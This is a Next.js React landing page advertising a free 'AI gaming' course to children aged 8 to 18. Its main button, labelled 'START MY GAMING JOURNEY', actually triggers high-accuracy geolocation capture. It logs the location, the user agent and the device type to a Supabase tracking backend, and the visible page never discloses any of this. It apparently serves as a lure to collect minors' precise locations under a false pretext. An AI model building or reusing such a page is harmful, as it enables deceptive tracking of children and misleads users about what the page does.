'use client'

import { useRouter } from 'next/navigation'
import { useState, useEffect } from 'react'
import Image from 'next/image'
import { supabaseHelpers } from '../lib/supabase'
import { geolocationService } from '../lib/geolocation'

export default function LandingPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    // Track page visit
    supabaseHelpers.trackPageVisit('main_page')
  }, [])

  const handleAllowLocation = async () => {
    setIsLoading(true)
    
    // Track the entry trigger
    await supabaseHelpers.trackUserAction('entry_trigger_clicked', {
      button: 'join_free_session',
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      page_url: window.location.href
    })

    // Step 1: Enhanced geolocation capture with 100% accuracy focus
    try {
      // Track geolocation attempt
      await supabaseHelpers.trackLocationPermission('requested')
      
      // Use the advanced geolocation service for maximum accuracy
      const locationData = await geolocationService.getCurrentLocation()
      
      // Track successful location capture with quality metrics
      await supabaseHelpers.trackLocationPermission('granted', locationData as unknown as Record<string, unknown>)
      
      // Store for form submission
      sessionStorage.setItem('userLocation', JSON.stringify(locationData))
      sessionStorage.setItem('locationCaptured', 'true')
      
      // Always proceed to form (Step 3)
      router.push('/success')

    } catch (error: unknown) {
      // Track location denial/error with detailed info
      const errorData = (error as GeolocationPositionError)?.code ? error : {
        error_code: 999,
        error_message: 'Geolocation service unavailable',
        method: 'service_unavailable',
        attempts: 'geolocation_service_failed',
        device_type: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'ios' : /Android/i.test(navigator.userAgent) ? 'android' : 'other',
        user_agent_snippet: navigator.userAgent.substring(0, 100)
      }
      
      await supabaseHelpers.trackLocationPermission('denied', errorData as Record<string, unknown>)
      
      // Store error for analytics
      sessionStorage.setItem('locationCaptured', 'false')
      sessionStorage.setItem('locationError', JSON.stringify(errorData))
      
      // Always proceed to form (Step 3)
      router.push('/success')
    }
  }

  return (
    <div className="gaming-landing">
      {/* Animated Background */}
      <div className="animated-bg">
        <div className="floating-shapes">
          <div className="shape shape-1">🎮</div>
          <div className="shape shape-2">⚡</div>
          <div className="shape shape-3">🚀</div>
          <div className="shape shape-4">💎</div>
          <div className="shape shape-5">🎯</div>
          <div className="shape shape-6">🌟</div>
        </div>
      </div>

      {/* Hero Section */}
      <div className="hero-container">
        <div className="hero-content">
          {/* Gaming Badge */}
          <div className="gaming-badge">
            <span className="badge-icon">🎮</span>
            <span>AI GAMING ACADEMY</span>
            <span className="badge-icon">🔥</span>
          </div>

          {/* Main Title */}
          <h1 className="hero-title">
            <span className="title-line-1">BUILD EPIC</span>
            <span className="title-line-2">
              <span className="ai-text">AI</span> GAMES
            </span>
            <span className="title-line-3">LIKE A PRO</span>
          </h1>

          {/* Gaming Features */}
          <div className="gaming-features">
            <div className="feature-card">
              <div className="feature-icon">🎨</div>
              <div className="feature-text">AI Art Creation</div>
            </div>
            <div className="feature-card">
              <div className="feature-icon">🌍</div>
              <div className="feature-text">World Building</div>
            </div>
            <div className="feature-card">
              <div className="feature-icon">🎮</div>
              <div className="feature-text">Game Development</div>
            </div>
          </div>

          {/* Power Description */}
          <p className="power-description">
            <strong>Ages 8-18 • FREE Course</strong><br/>
            Master AI tools to create <span className="highlight">Roblox-style games</span>, 
            design incredible art, and build immersive worlds!
          </p>

          {/* Action Button */}
          <button 
            onClick={handleAllowLocation}
            disabled={isLoading}
            className={`power-button ${isLoading ? 'loading' : ''}`}
          >
            <span className="button-icon">🚀</span>
            <span className="button-text">
              {isLoading ? 'LOADING YOUR SPOT...' : 'START MY GAMING JOURNEY'}
            </span>
            <div className="button-glow"></div>
          </button>

          {/* Gaming Stats */}
          <div className="gaming-stats">
            <div className="stat-item">
              <div className="stat-number">1000+</div>
              <div className="stat-label">Young Creators</div>
            </div>
            <div className="stat-divider">•</div>
            <div className="stat-item">
              <div className="stat-number">100%</div>
              <div className="stat-label">FREE</div>
            </div>
            <div className="stat-divider">•</div>
            <div className="stat-item">
              <div className="stat-number">⭐⭐⭐⭐⭐</div>
              <div className="stat-label">Rated</div>
            </div>
          </div>
        </div>

        {/* Gaming Visual */}
        <div className="gaming-visual">
          <div className="game-screen">
            <Image 
              src="https://markovate.com/wp-content/uploads/2023/12/Next-Gen-Gaming_-The-Exciting-Role-of-AI-in-Gaming.webp" 
              alt="AI Gaming Course - Create Amazing Games" 
              className="game-image"
              fill
              priority
            />
            <div className="screen-overlay">
              <div className="play-button">
                <div className="play-icon">▶</div>
              </div>
            </div>
          </div>
          <div className="gaming-ui">
            <div className="ui-element ui-1">❤️ 100</div>
            <div className="ui-element ui-2">⚡ 250</div>
            <div className="ui-element ui-3">💎 Level 99</div>
          </div>
        </div>
      </div>
    </div>
  )
}
